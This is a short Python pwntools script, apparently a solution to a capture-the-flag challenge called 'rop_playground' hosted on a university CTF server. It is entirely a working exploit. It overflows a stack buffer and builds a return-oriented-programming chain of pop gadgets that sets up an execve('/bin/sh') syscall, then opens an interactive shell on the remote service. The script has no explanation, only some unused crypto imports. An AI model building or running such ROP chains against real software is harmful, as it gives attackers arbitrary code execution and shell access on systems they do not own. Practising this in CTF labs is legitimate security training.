from pwn import *
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto.Cipher import PKCS1_OAEP
from Crypto.PublicKey import RSA
from Crypto.Util.number import long_to_bytes, bytes_to_long
import string
import math

elf = ELF('./rop_playground')
p = elf.process()
p = remote("cyberchallenge.diag.uniroma1.it", 5054)
payload = b'A'*32
payload += b'B'*8
payload += p64(0x40117E) #pop rax
payload += p64(0x3b)
bin_sh = 0x404078
payload += p64(0x401182) #pop rdi
payload += p64(bin_sh)
payload += p64(0X401184) #POP RSI 
payload += p64(0x0)
payload += p64(0x401180) #POP RDX
payload += p64(0x0)
payload += p64(0x401186) #syscall
p.send(payload)
p.interactive()